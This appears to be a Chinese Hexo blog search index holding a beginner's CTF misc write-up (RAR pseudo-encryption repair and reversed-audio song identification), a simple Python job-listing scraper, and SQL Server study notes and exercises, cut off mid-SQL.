<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一个菜鸡的祥云杯wp</title>
      <link href="posts/f07a.html"/>
      <url>posts/f07a.html</url>
      
        <content type="html"><![CDATA[<p>这次祥云杯除了签到题就搞出来一个杂项，这个wp主要是记录了我做题时的思路，也走了不少弯路，记录一下，希望以后可以做出两道，三道，慢慢进步！</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p><img src="https://img-blog.csdnimg.cn/20201123101335872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="签到题"><br>看着这熟悉的编码形式，直接进行base64解码，得到flag（注意不用加=）<br><img src="https://img-blog.csdnimg.cn/20201123101508333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="base64解密后"></p><pre class=" language-s"><code class="language-s">flag{qq_group_826566040}</code></pre><h2 id="进制反转"><a href="#进制反转" class="headerlink" title="进制反转"></a>进制反转</h2><p><a href="https://pan.baidu.com/s/1r1Hqd2Bu3xqa-bo7p-GNEw">题目附件链接</a><br>提取码：biw9<br><img src="https://img-blog.csdnimg.cn/20201123101842506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="进制反转"><br>下载附件后，是一个.rar压缩包，双击打开时，发现提示文件已损坏，打不开。<br><img src="https://img-blog.csdnimg.cn/20201123102342319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>然后想到题目中的“有时候还是手机好用”这句话，然后把压缩包发送到手机上，看能不能打开<br><img src="https://img-blog.csdnimg.cn/20201123102637266.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用手机打开，发现rar文件里包含了一个flag.wav文件，上网查了一下，<img src="https://img-blog.csdnimg.cn/20201123102826152.png#pic_center" alt="wav"><br>于是想要在手机上下载这个wav文件，却发现下载不了<br><img src="https://img-blog.csdnimg.cn/2020112310291285.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>能看见，就是下载不了，气不气？<br>然后又回到电脑上，手机可以打开，电脑却报错说文件损坏，肯定是有问题。然后查看了一下是否进行了压缩包伪加密，zip文件和rar文件的伪加密方法不一样，具体可以去其他文章进行了解，发现这个rar压缩包确实进行了伪加密。（rar压缩包判断方法为将压缩包放入winhex中，查看第14个十六进制数后面的那个数是0还是4，是4表示进行了伪加密，将4改为0就可以解除伪加密。）<br><img src="https://img-blog.csdnimg.cn/20201123103239784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现第14项十六进制数的后面一位为4，将4改为0，保存文件，成功打开该rar压缩包。<br><img src="https://img-blog.csdnimg.cn/20201123120856608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201123121619790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="成功打开rar压缩包"><br>成功得到其中的flag.wav文件，然后双击打开，发现打开不了：<br><img src="https://img-blog.csdnimg.cn/20201123121805616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>暂时打不开，就放入winhex里，看看是哪点出了问题，然后在最后发现一个提示：<br><img src="https://img-blog.csdnimg.cn/20201123153909729.png#pic_center" alt="提示"><br>flag is the song’sname   flag是这个歌的名字<br>看来必须得听到这个wav文件的内容才行<br>既然是和音频相关的文件，那就试着放入audacity中<br><img src="https://img-blog.csdnimg.cn/20201123152827676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>发现无法识别，那就按照他说的方法试试，直接导入原始数据<br><img src="https://img-blog.csdnimg.cn/20201123153117840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201123153157368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="成功导入"><br>导入成功，听了一下，不像是一首歌，感觉怪怪的，又返回去看了看题目，题目是“进制反转”，我这还没反转了，得到的歌是不是反过来的？然后尝试着用au将这段音频反过来<img src="https://img-blog.csdnimg.cn/20201123154456320.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再次听了一下，感觉像是一首歌了，就是太快了，然后放慢0.7倍速，再把声音调高一点，成功得到一段听起来挺正常的音乐文件。<br>最后就是判断这是哪首歌了，也许是我的音频文件处理的不好，各种听歌识曲都没有听出来，本人英语又比较差，这首英文歌就是听不出来，最后一个朋友去求救英语老师，才得到这首歌的名字:  Too Good At Goodbyes（英语老师不愧是英语老师!）<br>结合题目中对格式的要求，全部为大写，所以最后的flag为：</p><pre class=" language-t"><code class="language-t">flag{GOODATGOODBYES}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫初体验</title>
      <link href="posts/1458.html"/>
      <url>posts/1458.html</url>
      
        <content type="html"><![CDATA[<p>本人第一次接触爬虫，参考其他大佬的文章试着爬取了58同城兼职网页，网址为<a href="https://zz.58.com/zplvyoujiudian">https://zz.58.com/zplvyoujiudian</a><br>1.实现的功能为将页面上的招聘信息题目爬取出来放到指定的txt文件中。<br>2.如果提示某个模块没有安装的话，需要先安装对应的模块，具体方法可以去网上搜一下，一般用pip就行了。<br>2.想要实现翻页操作要找到不同页面url的规律，这个网站的规律很简单，比如网址后加上/pn1就是第一页，加上/pn2就是第二页，所以用for循环可以轻松实现翻页操作。</p><p>代码如下：</p><pre class=" language-py"><code class="language-py">#导入本代码需要用到的模块import requestsfrom bs4 import BeautifulSoupimport  re  #正则#指定爬取数据所存放的文件路径f=open(r"C:\Users\dell\Desktop\爬虫.txt","w")#设置请求头，模仿浏览器访问headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}#设置想要爬取的网页链接，用循环进行翻页操作来爬取多个页面for page in range(1,11):     print('************************************正在爬取第{}*********************************'.format(page))    url = 'https://zz.58.com/zplvyoujiudian/pn{}'.format(page)    #做数据解析前的准备    response = requests.get(url, headers=headers)    content = response.content    soup = BeautifulSoup(content, 'html.parser')    #获取所有兼职名，并存储在一个列表里    name_list = soup.find_all('span',attrs={'class':'name'})    for name in name_list:        # re.sub(r'\xa0...+\d','',re.sub('\n|New','',item.get_text()))  #正则去除多余内容        f.write(re.sub(r'\xa0...+\d','',re.sub('\n|New','',name.get_text())))        f.write("\n")f.close</code></pre><p><img src="https://img-blog.csdnimg.cn/20201113193309358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="执行后获取的数据"><br>本人第一次体验python爬虫，还是很兴奋的，以后会试着进行更深入的爬虫，如果有错误，还望指出。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql server 总复习</title>
      <link href="posts/cd1a.html"/>
      <url>posts/cd1a.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：这学期的数据库sql server结课了，为了期末的考试，把老师讲的重点汇总一下，期末考个好成绩。内容有点多，分几次写吧。</p><h1 id="第一章-数据库概述"><a href="#第一章-数据库概述" class="headerlink" title="第一章 数据库概述"></a>第一章 数据库概述</h1><h2 id="1-1数据库系统概述"><a href="#1-1数据库系统概述" class="headerlink" title="1.1数据库系统概述"></a>1.1数据库系统概述</h2><p>一、数据库（DB） 数据库系统（DBS） 数据库管理系统（DBMS）<br>数据库管理员（DBA）<br>DBS 包括 DB、DBMS、DBA</p><h2 id="1-2数据管理技术的发展"><a href="#1-2数据管理技术的发展" class="headerlink" title="1.2数据管理技术的发展"></a>1.2数据管理技术的发展</h2><p>1.人工管理截断<br>2.文件系统阶段<br>3.数据库系统阶段</p><h2 id="1-3数据库系统结构"><a href="#1-3数据库系统结构" class="headerlink" title="1.3数据库系统结构"></a>1.3数据库系统结构</h2><p><strong>1.3.1数据库系统的三级模式结构</strong><br>    1.外模式：又称子模式或用户模式，一个数据库可以有多个外模式。<br>    2.模式：又称概念模式或逻辑模式，一个数据库只有一个模式。<br>    3.内模式：又称存储模式，一个数据库只有一个内模式。<br><strong>1.3.2数据库的二级映射功能和数据独立性</strong><br>    1.外模式/模式映射<br>    2.模式/内模式映射</p><h2 id="1-4数据模型"><a href="#1-4数据模型" class="headerlink" title="1.4数据模型"></a>1.4数据模型</h2><p><strong>1.4.1两类数据模型</strong><br>    第一类：概念模型<br>    第二类：逻辑模型，其中包含物理模型<br><strong>1.4.2概念模型</strong><br>    1.概念模型的基本概念<br>    （1）实体（Entity）:客观存在并可相互区别的事物成为实体。<br>    （2）属性（Attribute）:实体所具有的某一特性成为属性。<br>    （3）联系（Relationship）:实体之间的联系，可分为两个实体集之间的联系、多个实体集之间的联、单个实体集之间的联系。<br>三种联系：<br>    一对一的联系（1:1）<br>    一对多的联系（1:n）<br>    多对多的联系（m:n）<br>    2.概念模型的表示方法<br>    概念模型较常用的表示方法是实体-联系模型（Entity-Relationship Model,E-R模型）。<br>    在E-R模型中：<br>    （1）实体用矩形框表示，把实体名写在矩形框内。<br>    （2）属性采用椭圆框表示，把属性名写在椭圆框内，并用无向边将其与对应的实体框相连。<br>    （3）联系采用菱形框表示，把联系名写在菱形框中，用无向边将参加联系的实体矩形框分别与菱形框相连，并将属性框与菱形框也用无向边连上。<br><strong>1.4.3数据模型组成要素</strong><br>    1.数据结构<br>    2.数据操作<br>    3.数据完整性约束<br><strong>1.4.4常用的数据模型</strong><br>    1.层次模型<br>    2.网状模型<br>    3.关系模型</p><h1 id="习题1"><a href="#习题1" class="headerlink" title="习题1"></a>习题1</h1><p>1.数据库中存储的是：(数据以及数据之间的联系)<br>2.信息的数据表现形式是：(文字、图形、声音、视频等都可)<br>3.数据库具有(数据结构化)、最小的冗余度和较高的程序与数据的独立性等特点。<br>4.数据库（DB）、数据库系统（DBS）、数据库管理系统（DBMS）的关系是（DBS包括DBMS和DB）<br>5.下面不属于数据模型要素的是(数据控制)<br>6.数据管理技术的发展阶段中，数据库系统阶段与文件系统阶段的根本区别是数据库系统（数据可共享）<br>7.数据库三级模式体系结构的划分，有利于保持数据库的（数据独立性）<br>8.在数据库三级模式结构中，内模式有（1个）<br>9.一个数据库系统的外模式（可以有多个）<br>10.要保证数据库的数据独立性，需要修改的是（三层模式之间的两层映射）<br>11.数据模型由数据结构、数据操作和（数据完整性约束）组成<br>12.数据库系统的三级模式包括外模式、模式和（内模式）<br>13.数据库的特性包括共享性、独立性、完整性和（减少数据冗余）</p><h1 id="第二章-关系数据库"><a href="#第二章-关系数据库" class="headerlink" title="第二章 关系数据库"></a>第二章 关系数据库</h1><h2 id="2-1关系模型"><a href="#2-1关系模型" class="headerlink" title="2.1关系模型"></a>2.1关系模型</h2><p><strong>2.1.1关系数据结构</strong><br>    1.关系<br>    （1）域（Domain）:域是一组具有相同数据类型的值的集合。<br>    （2）笛卡尔积（Cartesian Product）:域之间的元素两两相乘<br>    关系的元组、属性和候选码<br>    关系是笛卡尔积的有限子集，所以关系也是一个二维表。<br>    元组（Tuple）：表的每行对应一个元组。<br>    属性（Attribute）:表的每列对应一个域。由于域可以相同，为了加以区分，必须对每列起一个唯一的名字，成为属性。<br>    候选码（Candidate Key）：若关系中某一属性组的值能唯一地标识一个元组，则称该属性组为候选码，又称为候选键。<br>    主码（Primary Key）：在一个关系中有多个候选码，从中选定一个作为主码。<br>    2.关系模式<br>    <strong>定义2.4</strong> 关系模式（Relation Schema）可以形式化地表示为R(U,D,DOM,F)<br>    其中，R是关系名，U是组成改关系的属性名集合，D是属性所来自的域，DOM是属性向域的映射集合，F是属性间的属性依赖关系集合。<br><strong>2.1.2关系操作</strong><br>    1.基本的关系操作<br>    5种基本操作：并、差、笛卡尔积、选择、投影<br>    2.关系操作语言<br>    （1）关系代数语言<br>    （2）关系演算语言<br>    （3）结构化查询语言<br><strong>2.1.3关系的完整性</strong><br>1.实体完整性（Entity Integrity）<br>规则2.1实体完整性规则 若属性（一个或一组属性）A是基本关系R的主属性，则A不能取空值。（不能为空且唯一）<br>2.参照完整性（Referential Integrity）<br>参照完整性一般指多个实体之间的关系，一般用外码实现。<br>【例】学生实体与学院实体可用以下的关系表示，其中的主码用颜色标识。<br>学生（==学号==，姓名，性别，出生日期，专业，总学分）<br>学院（==学院号==，学院名，院长）<br>3.用户定义完整性（User-defined Integrity）</p><h1 id="习题2"><a href="#习题2" class="headerlink" title="习题2"></a>习题2</h1><p>1.关系模型中的一个候选键（可由一个或多个其值能唯一地标识该关系模式中任意元组的属性组成）<br>2.设关系R中有4个属性3个元组，设关系S中有6个属性4个元组，则R×S属性和元组个数分别是（10和12）<br>解析：列(属性)相加，行(元组)相乘<br>3.如果关系中某一属性组的值能唯一地标识一个元组，则称之为（候选码）<br>4.以下对关系性质的描述中，哪一项是错误的？（关系中允许出现相同的元组）<br>解析：关系元组，肯定存在主键，主键字段是不允许有重复的<br>5.关系模型上的关系操作包括（关系代数和关系演算）<br>6.关系中主码不允许取空值是符合（实体完整性）约束规则<br>7.5种基本关系运算是（∪、-、×、σ、π）<br>解析：并（U）、差（-）、笛卡儿积（×）、选择（σ）、投影（π）<br>8.集合R与S的交可用关系代数的基本运算表示为（R-(R-S)）<br>9.把关系R与S进行自然连接时舍弃的元组放到结果关系中去的操作是（外连接）<br>10.关系演算是用（谓词）来表达查询要求的方式。<br>11.关系模型由关系数据结构、关系操作和（关系完整性）三部分组成<br>12.关系操作的特点是（集合）操作方式<br>13.在关系模型的三种完整性约束中，（实体完整性）是关系模型必须满足的完整性约束条件，由DBMS自动支持。<br>14.一个关系模式可以形式化地表示为（R(U,D,DOM,F)）<br>15.关系操作语言可分为关系代数语言、关系演算语言和（结构化查询语言）<br>16.查询操作的5种基本操作是（并）、差、笛卡尔积、选择、投影</p><h1 id="第3章-关系数据库规范化理论"><a href="#第3章-关系数据库规范化理论" class="headerlink" title="第3章 关系数据库规范化理论"></a>第3章 关系数据库规范化理论</h1><p>范式，就是标准</p><h1 id="第4章-数据库设计"><a href="#第4章-数据库设计" class="headerlink" title="第4章 数据库设计"></a>第4章 数据库设计</h1><h2 id="4-1数据库设计概述"><a href="#4-1数据库设计概述" class="headerlink" title="4.1数据库设计概述"></a>4.1数据库设计概述</h2><p>数据库设计的基本步骤<br>（1）需求分析阶段<br>（2）概念结构设计阶段<br>（3）逻辑结构设计阶段<br>（4）物理结构设计阶段<br>（5）数据库实施阶段<br>（6）数据库运行和维护阶段                </p><h2 id="4-4逻辑结构设计"><a href="#4-4逻辑结构设计" class="headerlink" title="4.4逻辑结构设计"></a>4.4逻辑结构设计</h2><p>4.4.2 E-R模型向关系模型的转换<br>由E-R模型向关系模型转换有以下两个规则：<br>规则1：一个实体转换为一个关系模型。<br>实体的属性就是关系的属性，实体的码就是关系的码<br>规则2：实体间的联系转换为关系模型有以下不同的情况。<br>【例4.5】1:1的联系的E-R模型如图4.10所示，将 E-R模型转换为关系模型。<br><img src="https://img-blog.csdnimg.cn/20201111184900867.png#pic_center" alt="图4.10"></p><p>方案一：联系转换为独立的关系模型，则转换后的关系模型为<br>    学校（==学校编号==，名称，地址）<br>    校长（==校长编号==，姓名，职称）<br>    任职（==学校编号==，==校长编号==）<br>方案二：联合合并到“学校”关系模型中，则转换后的关系模型为<br>    学校（==学校编号==，名称，地址，校长编号）<br>    校长（==校长编号==，姓名，职称）<br>方案三：联合合并到“校长”关系模型中，则转换后的关系模型为<br>    学校（==学校编号==，名称，地址）<br>    校长（==校长编号==，姓名，职称，学校编号）<br>**<em>在1:1的联系中，一般不将联系转换为一个独立的关系模式，这是由于关系模式个数多，对应的表也很多，查询的时会降低查询效率。**</em><br>【例4.5】1:n的联系的E-R模型如图4.11所示，将E-R模型转换为关系模型。<br><img src="https://img-blog.csdnimg.cn/20201111185009195.png#pic_center" alt="图4.11"></p><p>方案一：联系转换为独立的关系模型，则转换后的关系模型为<br>    班级（==班级编号==，教室号，人数）<br>    学生（==学号==，姓名，性别，出生日期，专业，总学分）<br>    属于（==学号==，班级编号）<br>方案二：联系合并到n端实体对应的关系模型中，则转换后的关系模型为<br>    班级（==班级编号==，教室号，人数）<br>    学生（==学号==，姓名，性别，出生日期，班级编号）<br>同样，在1:n的联系中，一般也不将联系转换为一个独立的关系模型。<br>【例4.6】m:n的联系的E-R模型如图4.12所示，将E-R模型转换为关系模型<br><img src="https://img-blog.csdnimg.cn/20201111185041632.png#pic_center" alt="图4.12"><br>对于m:n联系，必须转换为独立的关系模式，转换后的关系模式为：<br>学生(==学号==, 姓名, 性别, 出生日期，专业，总学分)<br>课程(==课程号==,课程名,学分，教师号)<br>选课(==学号==,==课程号==,成绩) </p><h1 id="习题4"><a href="#习题4" class="headerlink" title="习题4"></a>习题4</h1><p>1.数据库设计中概念结构设计的主要工具是（E-R模型）<br>2.数据库设计人员和用户之间的沟通信息的桥梁是（实体联系图）<br>3.概念结构设计阶段得到的结果是（E-R模型表示的概念模型）<br>4.在关系数据库设计中，设计关系模式是（逻辑结构设计阶段）的任务。<br>5.生成DBMS系统支持的数据模型是在（逻辑结构设计）阶段完成的<br>6.在关系数据库设计中，对关系进行规范化处理，使关系达到一定的范式，是（逻辑结构设计阶段）的任务。<br>7.逻辑结构设计阶段得到的结果是（某个DBMS所支持的数据结构）<br>8.员工性别的取值，有的用“男”和“女”，有的用“1”和”0“，这种情况属于（属性冲突）<br>9.将E-R模型转换为关系模型的过程属于（逻辑结构设计阶段）<br>10.根据需求建立索引是在（物理结构设计）阶段完成的。<br>11.物理结构设计阶段得到的结果是（包括存储结构和存取方法的物理结构）<br>12.在关系数据库设计中，设计视图是（逻辑结构设计阶段）的任务。<br>13.进入数据库实施阶段，下述工作中，（扩充功能）不属于实施阶段的工作。<br>14.在数据库物理设计中，评价的重点是（时间和空间效率）<br>15.数据库设计6个阶段为：需求分析阶段，概念结构设计阶段，（逻辑结构设计阶段），物理结构设计阶段，数据库实施阶段，数据库运行和维护阶段。<br>16.结构化分析方法通过数据流图和（数据字典）描述系统。<br>17.概念结构设计阶段的目标是形成整体（数据库）的概念结构。<br>18.描述概念模型的有力工具是（E-R模型）<br>19.逻辑结构设计是将E-R模型转换为（关系模型）<br>20.数据库在物理设备上的存储结构和（存取方法）称为数据库的物理结构。<br>21.对物理结构进行评价的重点是（时间和空间效率）<br>22.在数据库运行阶段经常性的维护工作有（数据库的备份和恢复），数据库的安全性和完整性控制，监视，分析，调整数据库性能，数据库的重组和重构。</p><h1 id="第6章-创建数据库和创建表"><a href="#第6章-创建数据库和创建表" class="headerlink" title="第6章 创建数据库和创建表"></a>第6章 创建数据库和创建表</h1><h2 id="6-1-SQL-Server数据库概述"><a href="#6-1-SQL-Server数据库概述" class="headerlink" title="6.1 SQL Server数据库概述"></a>6.1 SQL Server数据库概述</h2><ol><li>数据库对象<br>SQL Server 的数据库对象包括表(table)、视图(view)、索引(index)、存储过程(stored procedure)、触发器(trigger)等。<br>●表：表是包含数据库中所有数据的数据库对象，由行和列构成，它是最重要的数据库对象。<br>●视图：视图是由一个表或多个表导出的表，又称为虚拟表。<br>●索引：加快数据检索速度并可以保证数据唯一性的数据结构。<br>● 存储过程：为完成特定功能的T-SQL语句集合，编译后存放于服务器端的数据库中。<br>● 触发器：它是一种是特殊的存储过程，当某个规定的事件发生时，该存储过程自动执行。</li><li>系统数据库和用户数据库<br>（1）系统数据库<br>SQL Server 在安装时创建4个系统数据库：master、model、msdb和tempdb。<br>（2）用户数据库<br>用户数据库是由用户创建的数据库。<br>6.1.2物理数据库<br>1.页和区<br>页和区是SQL Server 数据库的两个主要数据存储单位。<br>页：每个页的大小是8KB，每1MB的数据文件可以容纳128页，页是SQL Server中用于数据存储的最基本单位。<br>区：每8个连接的页组成一个区，区的大小是64KB，1MB的数据库有16个区，区用于控制表和索引的存储。</li><li>数据库文件<br>SQL Server 采用操作系统文件来存放数据库，使用的文件有主数据文件、辅助数据文件、日志文件三类。<br>（1）主数据文件(Primary)<br>主数据文件用于存储数据，每个数据库必须有也只能有一个主文件，它的默认扩展名为.mdf。<br>（2）辅助数据文件(Secondary)<br>辅助数据文件也用于存储数据，一个数据库中辅助数据文件可以创建多个，也可以没有，辅助数据文件的默认扩展名为.ndf。<br>（3）日志文件(Transaction Log)<br>日志文件用于保存恢复数据库所需的事务日志信息。每个数据库至少有一个日志文件，也可以有多个，日志文件的扩展名为.ldf。</li></ol><h1 id="习题6"><a href="#习题6" class="headerlink" title="习题6"></a>习题6</h1><p>1.在SQL Server中创建用户数据库，其大小必须大于或等于（master数据库的大小）<br>2.在SQL Server中，如果数据库rempdb的空间不足，可能会造成一些操作无法进行，此时需要扩大tempdb的空间。下列关于扩大tempdb空间的方法，错误的是（删除tempdb中的日志内容，以获得更多的数据空间）<br>3.在SQL Server中创建用户数据库，实际就是定义数据库所包含文件以及文件的属性。下列不属于数据文件属性的是（文件结构）<br>4.SQL Server数据库是由文件组成的 ，下列关于数据库所包含文件的说法中，正确的是（一个数据库可包含多个次要数据文件和多个日志文件）<br>5.在SQL Server系统数据库中，存放用户数据库公共信息的是（master）<br>6.出生日期字段不宜选择（float）<br>7.性别字段不宜选择（float）<br>8.（专业）字段可以采用默认值。<br>9.设在SQL Server中，某关系表需要存储职工的工资信息，工资的范围为2000~6000，采用整型类型存储。下列数据类型中最合适的是（smallint）<br>10.从用户的观点看，组成数据库的（逻辑成分）称为数据库对象<br>11.SQL Server的数据库对象包括表、（视图）、索引、存储过程、触发器等。<br>12.SQL Server的物理数据库框架包括页和区、（数据库文件）、数据库文件组等。<br>13.SQL Server数据库每个页的大小是8KB，每个区的大小是（64KB）<br>14.SQL Server使用的数据库文件有主数据文件、辅助数据文件、（日志文件）三类。<br>15.表结构包括一组固定的列，列由（数据类型）、长度、语序Null值等组成。<br>16.空值通常表示未知、（不可用）或将在以后添加的数据<br>17.创建表以前，首先要确定表名和表的属性，表所包含的（列名）、列的数据类型、是否为空、是否主键等，进行表结构设计。<br>18.整数型包括bigint、int、smallint和（tinyint）四类<br>19.字符型包括固定长度字符数据类型和（可变长度字符数据类型）两类<br>20.Unicode字符型用于支持国际上（非英语语种）的字符数据的存储和处理。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库编程技术与事务练习题</title>
      <link href="posts/d9f6.html"/>
      <url>posts/d9f6.html</url>
      
        <content type="html"><![CDATA[<p>##数据库编程技术与事务练习题</p><p>1、自定义一个函数实现下面功能：对于给定的一个员工号，查询该值在员工表中是否存在，如果存在返1，否则返回0。<br>通过调用上述函数判断某一个员工是否存在，如果存在，显示“该员工信息存在”，如果不存在，就显示“该员工信息不存在”。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> Empl<span class="token punctuation">(</span><span class="token variable">@EmplID</span> char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token keyword">int</span><span class="token keyword">as</span><span class="token keyword">begin</span><span class="token keyword">declare</span> <span class="token variable">@a</span> <span class="token keyword">int</span><span class="token keyword">if</span> <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Employee <span class="token keyword">where</span> EmplID<span class="token operator">=</span><span class="token variable">@EmplID</span><span class="token punctuation">)</span>    <span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">else</span>    <span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">return</span> <span class="token variable">@a</span><span class="token keyword">end</span>go<span class="token keyword">declare</span> <span class="token variable">@b</span> <span class="token keyword">int</span><span class="token keyword">select</span> <span class="token variable">@b</span><span class="token operator">=</span>dbo<span class="token punctuation">.</span>Empl<span class="token punctuation">(</span><span class="token string">'E011'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token variable">@b</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">print</span> <span class="token string">'该员工信息存在'</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string">'该员工信息不存在'</span></code></pre><p>2、自定义一个函数实现计算每个部门的平均工资，通过调用函数输出每个部门的平均工资。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> avg_wages<span class="token punctuation">(</span><span class="token variable">@DeptID</span> char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token keyword">float</span><span class="token keyword">as</span><span class="token keyword">begin</span><span class="token keyword">declare</span> <span class="token variable">@wages</span> <span class="token keyword">float</span><span class="token keyword">set</span> <span class="token variable">@wages</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">AVG</span><span class="token punctuation">(</span>Wages<span class="token punctuation">)</span> <span class="token keyword">from</span> Employee <span class="token keyword">where</span> DeptID<span class="token operator">=</span><span class="token variable">@DeptID</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token variable">@wages</span><span class="token keyword">end</span>go<span class="token keyword">declare</span> <span class="token variable">@wages</span> <span class="token keyword">float</span><span class="token keyword">select</span> <span class="token variable">@wages</span><span class="token operator">=</span>dbo<span class="token punctuation">.</span>avg_wages<span class="token punctuation">(</span><span class="token string">'D001'</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token variable">@wages</span> <span class="token keyword">as</span> <span class="token string">'部门平均工资'</span></code></pre><p>3、创建StoreSales数据库上的游标Emp_cursor，游标包含Employee表的全部列。<br>打开游标，读取其中六条数据，分别用 NEXT、PRIOR、FIRST、 LAST、<br>ABSOLUTE、RELATIVE实现。<br>关闭游标并删除游标。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">declare</span>    